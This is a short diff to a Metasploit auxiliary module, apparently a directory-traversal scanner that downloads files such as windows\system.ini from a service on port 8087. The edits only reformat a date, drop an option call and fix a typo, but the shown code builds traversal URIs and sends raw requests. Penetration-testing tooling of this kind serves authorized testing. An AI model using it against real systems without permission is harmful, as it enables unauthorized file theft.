@@ -28,7 +28,7 @@ class MetasploitModule < Msf::Auxiliary
           'sinn3r'
         ],
       'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Mar 07 2012"
+      'DisclosureDate' => '2012-03-07'
     ))
 
     register_options(
@@ -38,8 +38,6 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8087),
         OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
       ])
-
-    deregister_options('RHOST')
   end
 
   def run_host(ip)
@@ -51,7 +49,7 @@ class MetasploitModule < Msf::Auxiliary
     file = file[1,file.length] if file[0,1] == "\\"
 
     uri = "/#{trav}#{file}"
-    print_status("#{ip}:#{rport} - Retriving #{file}")
+    print_status("#{ip}:#{rport} - Retrieving #{file}")
 
     res = send_request_raw({
       'method' => 'GET',
